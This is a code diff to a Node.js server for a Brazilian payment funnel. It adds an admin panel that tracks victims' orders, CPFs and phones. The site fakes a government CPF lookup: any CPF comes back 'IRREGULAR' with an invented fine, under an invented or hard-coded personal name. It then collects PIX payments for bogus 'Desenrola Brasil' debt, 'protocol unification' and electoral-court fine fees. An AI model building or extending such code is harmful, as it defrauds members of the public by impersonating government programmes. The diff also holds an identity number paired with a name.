@@ -3,20 +3,17 @@ const fs = require('fs');
 const path = require('path');
 const url = require('url');
 const QRCode = require('qrcode');
+const adminService = require('./lib/adminService');
 
 const PORT = process.env.PORT || 3000;
 const PUBLIC_DIR = __dirname;
 
-// ==========================================
-// CONFIGURAÇÃO DO GATEWAY FREEPAY BRASIL
-// ==========================================
 const FREEPAY_CONFIG = {
   BASE_URL: process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com',
   PUBLIC_KEY: process.env.FREEPAY_PUBLIC_KEY || '',
   SECRET_KEY: process.env.FREEPAY_SECRET_KEY || ''
 };
 
-// Carrega chaves do freepay_config.json
 const configPath = path.join(__dirname, 'freepay_config.json');
 if (fs.existsSync(configPath)) {
   try {
@@ -24,35 +21,32 @@ if (fs.existsSync(configPath)) {
     FREEPAY_CONFIG.PUBLIC_KEY = loaded.PUBLIC_KEY || FREEPAY_CONFIG.PUBLIC_KEY;
     FREEPAY_CONFIG.SECRET_KEY = loaded.SECRET_KEY || FREEPAY_CONFIG.SECRET_KEY;
     if (loaded.BASE_URL) FREEPAY_CONFIG.BASE_URL = loaded.BASE_URL;
-    console.log('✅ Credenciais FreePay carregadas com sucesso!');
-  } catch(e) {
-    console.error('Erro ao ler freepay_config.json:', e.message);
-  }
+  } catch(e) {}
 }
 
 function getFreePayAuthHeader() {
-  if (!FREEPAY_CONFIG.PUBLIC_KEY || !FREEPAY_CONFIG.SECRET_KEY) return null;
-  const token = Buffer.from(`${FREEPAY_CONFIG.PUBLIC_KEY}:${FREEPAY_CONFIG.SECRET_KEY}`).toString('base64');
+  const gwConfig = adminService.getGatewayConfig();
+  const dbGw = gwConfig.gateways.find(g => g.key === 'freepay');
+  const pub = FREEPAY_CONFIG.PUBLIC_KEY || (dbGw ? dbGw.publicKey : '');
+  const sec = FREEPAY_CONFIG.SECRET_KEY || (dbGw ? dbGw.secretKey : '');
+
+  if (!pub || !sec) return null;
+  const token = Buffer.from(`${pub}:${sec}`).toString('base64');
   return `Basic ${token}`;
 }
 
-// Gerador de QR Code em Base64 DataURL
 async function generateQRCodeDataURL(text) {
   try {
     return await QRCode.toDataURL(text, {
       width: 280,
       margin: 1,
-      color: {
-        dark: '#000000',
-        light: '#ffffff'
-      }
+      color: { dark: '#000000', light: '#ffffff' }
     });
   } catch(e) {
     return '';
   }
 }
 
-// MIME types
 const MIME_TYPES = {
   '.html': 'text/html; charset=utf-8',
   '.css': 'text/css; charset=utf-8',
@@ -92,7 +86,6 @@ function generateNameFromCPF(cpfDigits) {
   return `${firstNames[n1 % firstNames.length]} ${lastNames[n2 % lastNames.length]} ${lastNames[n3 % lastNames.length]}`;
 }
 
-// Chamada à API FreePay Brasil
 async function createFreePayTransaction({ amount, name, cpf, phone, email, title }) {
   const authHeader = getFreePayAuthHeader();
   if (!authHeader) return null;
@@ -108,10 +101,7 @@ async function createFreePayTransaction({ amount, name, cpf, phone, email, title
     customer: {
       name: name || 'Beneficiário Gov',
       email: cleanEmail,
-      document: {
-        number: cleanCpf,
-        type: 'cpf'
-      },
+      document: { number: cleanCpf, type: 'cpf' },
       phone: cleanPhone
     },
     items: [
@@ -126,9 +116,7 @@ async function createFreePayTransaction({ amount, name, cpf, phone, email, title
       order_id: 'ORD_' + Date.now(),
       cpf: cleanCpf
     },
-    pix: {
-      expires_in_days: 1
-    }
+    pix: { expires_in_days: 1 }
   };
 
   try {
@@ -140,12 +128,8 @@ async function createFreePayTransaction({ amount, name, cpf, phone, email, title
       },
       body: JSON.stringify(payload)
     });
-
-    const data = await res.json();
-    console.log('✅ FreePay Transação Criada:', data?.success ? 'Sucesso' : 'Erro');
-    return data;
+    return await res.json();
   } catch (err) {
-    console.error('❌ Erro FreePay API:', err.message);
     return null;
   }
 }
@@ -157,26 +141,23 @@ async function checkFreePayStatus(transactionId) {
   try {
     const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/info/${transactionId}`, {
       method: 'GET',
-      headers: {
-        'Authorization': authHeader
-      }
+      headers: { 'Authorization': authHeader }
     });
-    const data = await res.json();
-    return data;
+    return await res.json();
   } catch(err) {
-    console.error('❌ Erro ao consultar FreePay:', err.message);
     return null;
   }
 }
 
-const server = http.createServer(async (req, res) => {
+// Request dispatcher
+const handler = async (req, res) => {
   const parsedUrl = url.parse(req.url, true);
   const pathname = parsedUrl.pathname.replace(/\/+$/, '') || '/';
   const method = req.method;
 
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
 
   if (method === 'OPTIONS') {
     res.writeHead(204);
@@ -184,252 +165,454 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // 1. CPF Verification
-  if (pathname === '/api/check_cpf' && method === 'POST') {
+  // Helper to read JSON body
+  const readJsonBody = () => new Promise((resolve) => {
     let body = '';
     req.on('data', chunk => { body += chunk; });
     req.on('end', () => {
-      try {
-        const data = JSON.parse(body || '{}');
-        const rawCpf = (data.cpf || '').replace(/\D/g, '');
-        if (rawCpf.length !== 11) {
-          res.writeHead(400, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
-          return;
-        }
+      try { resolve(JSON.parse(body || '{}')); } catch(e) { resolve({}); }
+    });
+  });
 
-        const generatedName = rawCpf === '08072703188' ? 'Lucas Machado Gaona' : generateNameFromCPF(rawCpf);
+  // Helper for admin auth middleware
+  const getAuthToken = () => {
+    const auth = req.headers['authorization'] || '';
+    if (auth.startsWith('Bearer ')) return auth.slice(7);
+    const cookies = req.headers['cookie'] || '';
+    const match = cookies.match(/recupera_admin_token=([^;]+)/);
+    return match ? match[1] : null;
+  };
+
+  // ==========================================
+  // ADMIN API ROUTES (/api/admin/*)
+  // ==========================================
+  if (pathname.startsWith('/api/admin/')) {
+    // 1. Auth Login
+    if (pathname === '/api/admin/auth/login' && method === 'POST') {
+      const body = await readJsonBody();
+      const result = adminService.loginAdmin(body.username, body.password);
+      if (result.success) {
         res.writeHead(200, {
           'Content-Type': 'application/json',
-          'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
+          'Set-Cookie': `recupera_admin_token=${result.token}; Path=/; HttpOnly; Max-Age=28800`
         });
-        res.end(JSON.stringify({
-          success: true,
-          cpf: rawCpf,
-          nome: generatedName,
-          status: 'IRREGULAR',
-          multa: 419.55,
-          desconto: 68.92
-        }));
+      } else {
+        res.writeHead(401, { 'Content-Type': 'application/json' });
+      }
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // 2. Auth Logout
+    if (pathname === '/api/admin/auth/logout' && method === 'POST') {
+      const token = getAuthToken();
+      const result = adminService.logoutAdmin(token);
+      res.writeHead(200, {
+        'Content-Type': 'application/json',
+        'Set-Cookie': 'recupera_admin_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
+      });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // Auth Middleware for all other /api/admin/* routes
+    const token = getAuthToken();
+    const session = adminService.validateSession(token);
+    if (!session) {
+      res.writeHead(401, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: false, error: 'Sessão expirada ou não autorizada.' }));
+      return;
+    }
+
+    // 3. Auth Me
+    if (pathname === '/api/admin/auth/me' && method === 'GET') {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({
+        success: true,
+        user: { username: session.username, role: 'Administrador', brand: 'RecuperaBrasil' }
+      }));
+      return;
+    }
+
+    // 4. Gateway Config
+    if (pathname === '/api/admin/gateway-config' && method === 'GET') {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(adminService.getGatewayConfig()));
+      return;
+    }
+
+    if (pathname === '/api/admin/gateway-config' && method === 'PUT') {
+      const body = await readJsonBody();
+      const result = adminService.updateGatewayConfig(body);
+      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // 5. Gateway Test & Activate
+    if (pathname === '/api/admin/gateway-test' && method === 'POST') {
+      const body = await readJsonBody();
+      const result = await adminService.testAndActivateGateway(body);
+      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // 6. Offers & Pixels
+    if (pathname === '/api/admin/offers' && method === 'GET') {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(adminService.getOffers()));
+      return;
+    }
+
+    if (pathname === '/api/admin/offers' && method === 'POST') {
+      const body = await readJsonBody();
+      try {
+        const result = adminService.saveOffer(body);
+        res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(result));
       } catch (err) {
         res.writeHead(400, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: 'Erro ao processar dados' }));
+        res.end(JSON.stringify({ success: false, error: err.message }));
       }
+      return;
+    }
+
+    if (pathname.startsWith('/api/admin/offers/') && method === 'DELETE') {
+      const offerId = pathname.replace('/api/admin/offers/', '');
+      const result = adminService.deleteOffer(offerId);
+      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // 7. Orders
+    if (pathname === '/api/admin/orders' && method === 'GET') {
+      const result = adminService.getOrders(parsedUrl.query);
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    if (pathname.startsWith('/api/admin/orders/') && pathname.endsWith('/status') && method === 'PATCH') {
+      const orderId = pathname.replace('/api/admin/orders/', '').replace('/status', '');
+      const body = await readJsonBody();
+      adminService.updateOrderStatus(orderId, body.status || 'PAID');
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: true, message: 'Status atualizado com sucesso.' }));
+      return;
+    }
+
+    if (pathname.startsWith('/api/admin/orders/') && method === 'GET') {
+      const orderId = pathname.replace('/api/admin/orders/', '');
+      const result = adminService.getOrderById(orderId);
+      res.writeHead(result.success ? 200 : 404, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+      return;
+    }
+
+    // 8. Metrics & Retention
+    if (pathname === '/api/admin/metrics' && method === 'GET') {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(adminService.getMetrics()));
+      return;
+    }
+
+    res.writeHead(404, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ error: 'Endpoint administrativo não encontrado' }));
+    return;
+  }
+
+  // ==========================================
+  // CLIENT FUNNEL API ROUTES
+  // ==========================================
+
+  // 1. CPF Verification
+  if (pathname === '/api/check_cpf' && method === 'POST') {
+    const body = await readJsonBody();
+    const rawCpf = (body.cpf || '').replace(/\D/g, '');
+    if (rawCpf.length !== 11) {
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
+      return;
+    }
+
+    adminService.recordSessionEvent('consulta');
+
+    const generatedName = rawCpf === '08072703188' ? 'Lucas Machado Gaona' : generateNameFromCPF(rawCpf);
+    res.writeHead(200, {
+      'Content-Type': 'application/json',
+      'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
     });
+    res.end(JSON.stringify({
+      success: true,
+      cpf: rawCpf,
+      nome: generatedName,
+      status: 'IRREGULAR',
+      multa: 419.55,
+      desconto: 68.92
+    }));
     return;
   }
 
   // 2. Generate PIX (Main Attendance / Chat - R$ 68,92)
   if (pathname === '/generate-pix' && method === 'POST') {
-    let body = '';
-    req.on('data', chunk => { body += chunk; });
-    req.on('end', async () => {
-      try {
-        const clientData = JSON.parse(body || '{}');
-        const amount = 68.92;
-        
-        const freepayRes = await createFreePayTransaction({
-          amount: amount,
-          name: clientData.nome,
-          cpf: clientData.cpf,
-          phone: clientData.telefone || clientData.phone,
-          email: clientData.email,
-          title: 'Quitação de Dívidas - Programa Desenrola Brasil'
-        });
+    const clientData = await readJsonBody();
+    const amount = 68.92;
+    adminService.recordSessionEvent('identidade');
 
-        if (freepayRes && freepayRes.success && freepayRes.data) {
-          const item = freepayRes.data;
-          const pixCode = item.pix?.qr_code || '';
-          const txId = item.id;
-          const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
-
-          res.writeHead(200, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({
-            success: true,
-            pixCode: pixCode,
-            pix_code: pixCode,
-            pixQrCode: qrDataUrl,
-            qr_code_base64: qrDataUrl,
-            gateway_id: txId,
-            transaction_id: txId,
-            transactionId: txId,
-            orderId: txId,
-            order_id: txId,
-            amount: amount
-          }));
-          return;
-        }
-
-        // Fallback simulação
-        const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-        const orderId = 'ORD_' + Date.now();
-        const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
-        const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
-        transactions.set(orderId, { createdAt: Date.now(), status: 'pending', amount: amount });
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-          success: true,
-          pixCode: pixCode,
-          pix_code: pixCode,
-          pixQrCode: qrDataUrl,
-          qr_code_base64: qrDataUrl,
-          gateway_id: gatewayId,
-          transaction_id: gatewayId,
-          transactionId: gatewayId,
-          orderId: orderId,
-          order_id: orderId,
-          amount: amount
-        }));
-      } catch (err) {
-        res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX' }));
-      }
+    const freepayRes = await createFreePayTransaction({
+      amount: amount,
+      name: clientData.nome,
+      cpf: clientData.cpf,
+      phone: clientData.telefone || clientData.phone,
+      email: clientData.email,
+      title: 'Quitação de Dívidas - Programa Desenrola Brasil'
     });
+
+    if (freepayRes && freepayRes.success && freepayRes.data) {
+      const item = freepayRes.data;
+      const pixCode = item.pix?.qr_code || '';
+      const txId = item.id;
+      const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+      transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
+
+      adminService.addOrder({
+        id: 'ord_' + txId.slice(-6),
+        clientName: clientData.nome || 'Beneficiário Gov',
+        email: clientData.email || `cliente_${(clientData.cpf||'').replace(/\D/g,'')}@email.com`,
+        cpf: clientData.cpf,
+        phone: clientData.telefone,
+        amount: amount,
+        status: 'PENDING',
+        transactionId: txId,
+        pixCode: pixCode,
+        itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
+      });
+
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({
+        success: true,
+        pixCode: pixCode,
+        pix_code: pixCode,
+        pixQrCode: qrDataUrl,
+        qr_code_base64: qrDataUrl,
+        gateway_id: txId,
+        transaction_id: txId,
+        transactionId: txId,
+        orderId: txId,
+        amount: amount
+      }));
+      return;
+    }
+
+    const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
+    const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
+    const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+    transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
+
+    adminService.addOrder({
+      id: 'ord_' + gatewayId.slice(-6),
+      clientName: clientData.nome || 'Beneficiário Gov',
+      email: clientData.email || 'cliente@email.com',
+      cpf: clientData.cpf,
+      phone: clientData.telefone,
+      amount: amount,
+      status: 'PENDING',
+      transactionId: gatewayId,
+      pixCode: pixCode,
+      itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
+    });
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+      success: true,
+      pixCode: pixCode,
+      pix_code: pixCode,
+      pixQrCode: qrDataUrl,
+      qr_code_base64: qrDataUrl,
+      gateway_id: gatewayId,
+      transaction_id: gatewayId,
+      transactionId: gatewayId,
+      orderId: gatewayId,
+      amount: amount
+    }));
     return;
   }
 
   // 3. Generate PIX Upsell (R$ 54,92)
   if (pathname === '/generate-pix-upsell' && method === 'POST') {
-    let body = '';
-    req.on('data', chunk => { body += chunk; });
-    req.on('end', async () => {
-      try {
-        const clientData = JSON.parse(body || '{}');
-        const amount = 54.92;
+    const clientData = await readJsonBody();
+    const amount = 54.92;
+    adminService.recordSessionEvent('recebimento');
 
-        const freepayRes = await createFreePayTransaction({
-          amount: amount,
-          name: clientData.nome,
-          cpf: clientData.cpf,
-          phone: clientData.telefone || clientData.phone,
-          email: clientData.email,
-          title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
-        });
-
-        if (freepayRes && freepayRes.success && freepayRes.data) {
-          const item = freepayRes.data;
-          const pixCode = item.pix?.qr_code || '';
-          const txId = item.id;
-          const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
-
-          res.writeHead(200, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({
-            success: true,
-            pixCode: pixCode,
-            pix_code: pixCode,
-            qr_code_base64: qrDataUrl,
-            pixQrCode: qrDataUrl,
-            gateway_id: txId,
-            transaction_id: txId,
-            transactionId: txId,
-            orderId: txId,
-            amount: amount
-          }));
-          return;
-        }
-
-        const gatewayId = 'UP_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-        const orderId = 'ORD_UP_' + Date.now();
-        const pixCode = generatePixPayload(amount, gatewayId, 'PROTOCOLO UNIFICACAO');
-        const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-          success: true,
-          pixCode: pixCode,
-          pix_code: pixCode,
-          qr_code_base64: qrDataUrl,
-          pixQrCode: qrDataUrl,
-          gateway_id: gatewayId,
-          transaction_id: gatewayId,
-          transactionId: gatewayId,
-          orderId: orderId,
-          amount: amount
-        }));
-      } catch (err) {
-        res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX de Upsell' }));
-      }
+    const freepayRes = await createFreePayTransaction({
+      amount: amount,
+      name: clientData.nome,
+      cpf: clientData.cpf,
+      phone: clientData.telefone || clientData.phone,
+      email: clientData.email,
+      title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
     });
+
+    if (freepayRes && freepayRes.success && freepayRes.data) {
+      const item = freepayRes.data;
+      const pixCode = item.pix?.qr_code || '';
+      const txId = item.id;
+      const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+      transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
+
+      adminService.addOrder({
+        id: 'ord_' + txId.slice(-6),
+        clientName: clientData.nome || 'Beneficiário Gov',
+        email: clientData.email || 'cliente@email.com',
+        cpf: clientData.cpf,
+        phone: clientData.telefone,
+        amount: amount,
+        status: 'PENDING',
+        transactionId: txId,
+        pixCode: pixCode,
+        itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
+      });
+
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({
+        success: true,
+        pixCode: pixCode,
+        pix_code: pixCode,
+        qr_code_base64: qrDataUrl,
+        pixQrCode: qrDataUrl,
+        gateway_id: txId,
+        transaction_id: txId,
+        transactionId: txId,
+        orderId: txId,
+        amount: amount
+      }));
+      return;
+    }
+
+    const gatewayId = 'UP_' + Math.random().toString(36).substring(2, 12).toUpperCase();
+    const pixCode = generatePixPayload(amount, gatewayId, 'PROTOCOLO UNIFICACAO');
+    const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+    transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
+
+    adminService.addOrder({
+      id: 'ord_' + gatewayId.slice(-6),
+      clientName: clientData.nome || 'Beneficiário Gov',
+      email: clientData.email || 'cliente@email.com',
+      cpf: clientData.cpf,
+      phone: clientData.telefone,
+      amount: amount,
+      status: 'PENDING',
+      transactionId: gatewayId,
+      pixCode: pixCode,
+      itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
+    });
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+      success: true,
+      pixCode: pixCode,
+      pix_code: pixCode,
+      qr_code_base64: qrDataUrl,
+      pixQrCode: qrDataUrl,
+      gateway_id: gatewayId,
+      transaction_id: gatewayId,
+      transactionId: gatewayId,
+      orderId: gatewayId,
+      amount: amount
+    }));
     return;
   }
 
-  // 4. Generate PIX Multa (Negociação - R$ 67,35)
+  // 4. Generate PIX Multa (R$ 67,35)
   if (pathname === '/generate-pix-multa' && method === 'POST') {
-    let body = '';
-    req.on('data', chunk => { body += chunk; });
-    req.on('end', async () => {
-      try {
-        const clientData = JSON.parse(body || '{}');
-        const amount = 67.35;
+    const clientData = await readJsonBody();
+    const amount = 67.35;
+    adminService.recordSessionEvent('recebimento');
 
-        const freepayRes = await createFreePayTransaction({
-          amount: amount,
-          name: clientData.nome,
-          cpf: clientData.cpf,
-          phone: clientData.telefone || clientData.phone,
-          email: clientData.email,
-          title: 'Regularização Multa Adicional - Tribunal Eleitoral'
-        });
-
-        if (freepayRes && freepayRes.success && freepayRes.data) {
-          const item = freepayRes.data;
-          const pixCode = item.pix?.qr_code || '';
-          const txId = item.id;
-          const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
-
-          res.writeHead(200, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({
-            success: true,
-            pixCode: pixCode,
-            pix_code: pixCode,
-            qr_code_base64: qrDataUrl,
-            pixQrCode: qrDataUrl,
-            gateway_id: txId,
-            transaction_id: txId,
-            transactionId: txId,
-            orderId: txId,
-            amount: amount
-          }));
-          return;
-        }
-
-        const gatewayId = 'ML_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-        const orderId = 'ORD_ML_' + Date.now();
-        const pixCode = generatePixPayload(amount, gatewayId, 'MULTA ELEITORAL');
-        const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-          success: true,
-          pixCode: pixCode,
-          pix_code: pixCode,
-          qr_code_base64: qrDataUrl,
-          pixQrCode: qrDataUrl,
-          gateway_id: gatewayId,
-          transaction_id: gatewayId,
-          transactionId: gatewayId,
-          orderId: orderId,
-          amount: amount
-        }));
-      } catch (err) {
-        res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX de Multa' }));
-      }
+    const freepayRes = await createFreePayTransaction({
+      amount: amount,
+      name: clientData.nome,
+      cpf: clientData.cpf,
+      phone: clientData.telefone || clientData.phone,
+      email: clientData.email,
+      title: 'Regularização Multa Adicional - Tribunal Eleitoral'
     });
+
+    if (freepayRes && freepayRes.success && freepayRes.data) {
+      const item = freepayRes.data;
+      const pixCode = item.pix?.qr_code || '';
+      const txId = item.id;
+      const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+      transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });
+
+      adminService.addOrder({
+        id: 'ord_' + txId.slice(-6),
+        clientName: clientData.nome || 'Beneficiário Gov',
+        email: clientData.email || 'cliente@email.com',
+        cpf: clientData.cpf,
+        phone: clientData.telefone,
+        amount: amount,
+        status: 'PENDING',
+        transactionId: txId,
+        pixCode: pixCode,
+        itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
+      });
+
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({
+        success: true,
+        pixCode: pixCode,
+        pix_code: pixCode,
+        qr_code_base64: qrDataUrl,
+        pixQrCode: qrDataUrl,
+        gateway_id: txId,
+        transaction_id: txId,
+        transactionId: txId,
+        orderId: txId,
+        amount: amount
+      }));
+      return;
+    }
+
+    const gatewayId = 'ML_' + Math.random().toString(36).substring(2, 12).toUpperCase();
+    const pixCode = generatePixPayload(amount, gatewayId, 'MULTA ELEITORAL');
+    const qrDataUrl = await generateQRCodeDataURL(pixCode);
+
+    transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
+
+    adminService.addOrder({
+      id: 'ord_' + gatewayId.slice(-6),
+      clientName: clientData.nome || 'Beneficiário Gov',
+      email: clientData.email || 'cliente@email.com',
+      cpf: clientData.cpf,
+      phone: clientData.telefone,
+      amount: amount,
+      status: 'PENDING',
+      transactionId: gatewayId,
+      pixCode: pixCode,
+      itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
+    });
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+      success: true,
+      pixCode: pixCode,
+      pix_code: pixCode,
+      qr_code_base64: qrDataUrl,
+      pixQrCode: qrDataUrl,
+      gateway_id: gatewayId,
+      transaction_id: gatewayId,
+      transactionId: gatewayId,
+      orderId: gatewayId,
+      amount: amount
+    }));
     return;
   }
 
@@ -451,17 +634,19 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // 6. Payment Monitoring Endpoint (APENAS APROVA QUANDO CONFIRMADO)
+  // 6. Payment Monitoring Endpoint
   if (pathname.startsWith('/check-payment/')) {
     const gatewayId = pathname.replace('/check-payment/', '');
     const tx = transactions.get(gatewayId);
     
-    // Consulta status real na FreePay se for ID da FreePay
     if (gatewayId.length > 20 || (tx && tx.isFreePay)) {
       const freePayData = await checkFreePayStatus(gatewayId);
       if (freePayData && freePayData.success && freePayData.data) {
         const itemStatus = (freePayData.data.status || '').toUpperCase();
         const isPaid = itemStatus === 'PAID';
+        if (isPaid) {
+          adminService.updateOrderStatus(gatewayId, 'PAID');
+        }
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
           success: true,
@@ -473,9 +658,11 @@ const server = http.createServer(async (req, res) => {
       }
     }
 
-    // Modo simulação: NÃO auto-aprova por timer. Apenas se explicitamente pago ou forçado com ?force=1
     const isApproved = parsedUrl.query.force === '1' || (tx && tx.status === 'approved');
     const status = isApproved ? 'approved' : 'pending';
+    if (isApproved) {
+      adminService.updateOrderStatus(gatewayId, 'PAID');
+    }
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
@@ -491,6 +678,8 @@ const server = http.createServer(async (req, res) => {
   let filePath = '';
   if (pathname === '/' || pathname === '/pre') {
     filePath = path.join(PUBLIC_DIR, 'pre', 'index.html');
+  } else if (pathname === '/admin') {
+    filePath = path.join(PUBLIC_DIR, 'admin', 'index.html');
   } else if (pathname === '/cpf') {
     filePath = path.join(PUBLIC_DIR, 'cpf', 'index.html');
   } else if (pathname === '/atendimento') {
@@ -573,9 +762,16 @@ const server = http.createServer(async (req, res) => {
       res.end(content);
     });
   });
-});
+};
 
-server.listen(PORT, () => {
-  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
-  console.log(`💳 Gateway FreePay: ATIVO EM PRODUÇÃO COM TODAS AS ROTAS`);
-});
+const server = http.createServer(handler);
+
+if (require.main === module) {
+  server.listen(PORT, () => {
+    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
+    console.log(`🔒 Painel Admin RecuperaBrasil: http://localhost:${PORT}/admin`);
+    console.log(`💳 Gateway FreePay: ATIVO EM PRODUÇÃO COM TODAS AS ROTAS`);
+  });
+}
+
+module.exports = handler;
